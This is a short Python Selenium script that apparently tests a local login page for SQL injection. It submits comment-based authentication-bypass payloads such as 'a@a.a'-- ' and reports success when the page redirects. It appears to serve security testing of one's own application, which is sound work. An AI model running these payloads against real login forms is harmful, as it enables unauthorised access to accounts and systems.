from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time


def try_sqlinj(user_name, password):
    driver = webdriver.Chrome()

    driver_url = 'http://localhost:8000/Login.php'
    driver.get(driver_url)

    # Wait for the page to load (you can use other wait strategies too)
    time.sleep(2)

    # Find and fill the fields with desired values
    input_elements = driver.find_elements(By.TAG_NAME, "input")
    input_elements = [element for element in input_elements if element.is_displayed()]

    input_elements[0].send_keys(user_name)
    input_elements[1].send_keys(password)

    """
    input_elements[0].send_keys('a@a.a\'/*')
    input_elements[1].send_keys('\'*/\'')

    # another option
    # input_elements[0].send_keys('a@a.a\'-- ')
    """

    button_elements = driver.find_elements(By.TAG_NAME, "button")
    button_elements = [element for element in button_elements if element.is_displayed() and
                       (element.get_attribute("type") == "submit" or element.get_attribute("disabled type") == "submit")]

    button_elements[-1].click()

    time.sleep(2)
    new_url = driver.current_url
    time.sleep(2)
    passed = False
    if driver_url != new_url:
        print('sql injection succeeded')
        passed = True
    else:
        print('sql injection failed')

    # Close the browser window
    driver.quit()
    return passed


injections = [['a@a.a\'/*', '\'*/\''], ['a@a.a\'-- ', '']]
for injection in injections:
    passed = try_sqlinj(injection[0], injection[1])
    print(passed)


